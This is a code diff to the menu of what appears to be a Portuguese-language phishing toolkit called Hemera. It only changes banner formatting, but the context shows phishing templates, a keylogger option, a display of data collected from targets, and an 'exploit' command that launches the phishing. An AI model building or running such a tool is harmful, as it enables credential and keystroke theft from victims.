@@ -171,7 +171,7 @@ def menu_program(): #Menu do Programa
         elif (prompt[0] == "show" and prompt[1] == "options" or prompt[0] == "SHOW" and prompt[1] == "OPTIONS"):
          try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
            banner_program()
-           print ("\n\t" + G + "  [+]════════════[ OPÇÕES ]════════════[+]")
+           print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
            table = [[C + "          Template:    " + G, "%s" %template_phishing], [C + "          Porta:    " + G, "%i" %porta], [C + "          URL de Ação:    " + G, "%s" %url_action], [C + "          Encurtar URL:    " + G, "%s" %encurtar_url], [C + "          Keylogger:    " + G, "%s" %keylogger]]
            print (tabulate(table, tablefmt="fancy_grid"))
            continue
@@ -1307,7 +1307,7 @@ def menu_log():
         elif (prompt[0] == "show" and prompt[1] == "options" or prompt[0] == "SHOW" and prompt[1] == "OPTIONS"):
          try:
            banner_program()
-           print ("\n\t" + G + "   [════════════[ OPÇÕES ]════════════]")
+           print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
            table = [[C + "          Template:    " + G, "%s" %template_phishing], [C + "          Porta:    " + G, "%i" %porta], [C + "          URL de Ação:    " + G, "%s" %url_action], [C + "          Encurtar URL:    " + G, "%s" %encurtar_url], [C + "          Keylogger:    " + G, "%s" %keylogger]]
            print (tabulate(table, tablefmt="fancy_grid"))
            continue
@@ -1317,7 +1317,7 @@ def menu_log():
            banner_program()
         elif (prompt[0] == "help" or prompt[0] == "HELP" or prompt[0] == "h" or prompt[0] == "?"):
           banner_program()
-          print ("\n" + A + G + "═══════════════════════════[ AJUDA/HELP ]══════════════════════════════════")
+          print ("\n" + A + G + "[+]═══════════════════════════[ AJUDA/HELP ]══════════════════════════════════[+]")
           print ("\n" + A + C + "Comando:" + W + " show options " + C + "=> " + R + "exibir configurações")
           print ("\n" + A + C + "Comando:" + W + " show templates " + C + "=> " + G + "exibir templates disponiveis")
           print ("\n" + A + C + "Comando:" + W + " show history " + C + "=> " + G + "exibir dados coletados do alvo anterior")
@@ -1330,7 +1330,7 @@ def menu_log():
           print ("\n" + A + C + "Comando:" + W + " banner " + C + "=> " + G + "Altera o Banner do Hemera")
           print ("\n" + A + C + "Comando:" + W + " exploit " + C + "=> " + R + "Executa o Phishing")
           print ("\n" + A + C + "Comando:" + W + " sair " + C + "=> " + R + "sair do Programa")
-          print ("\n" + A + G + "═══════════════════════════════════════════════════════════════════════════")
+          print ("\n" + A + G + "[+]═══════════════════════════════════════════════════════════════════════════[+]")
         elif (prompt[0] == "set" and prompt[1] == "template"):
           try:
             template_phishing = str(prompt[2])
